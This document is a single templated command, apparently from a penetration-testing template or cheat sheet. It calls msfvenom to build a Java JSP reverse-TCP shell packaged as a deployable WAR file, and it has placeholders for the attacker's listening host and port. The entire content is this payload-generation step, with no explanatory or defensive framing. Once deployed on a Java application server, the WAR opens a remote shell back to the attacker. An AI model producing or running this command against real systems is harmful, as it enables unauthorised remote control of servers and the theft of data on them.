msfvenom --payload java/jsp_shell_reverse_tcp --format war --output ./shell.war LHOST={{ LHOST }} LPORT={{ LPORT }}
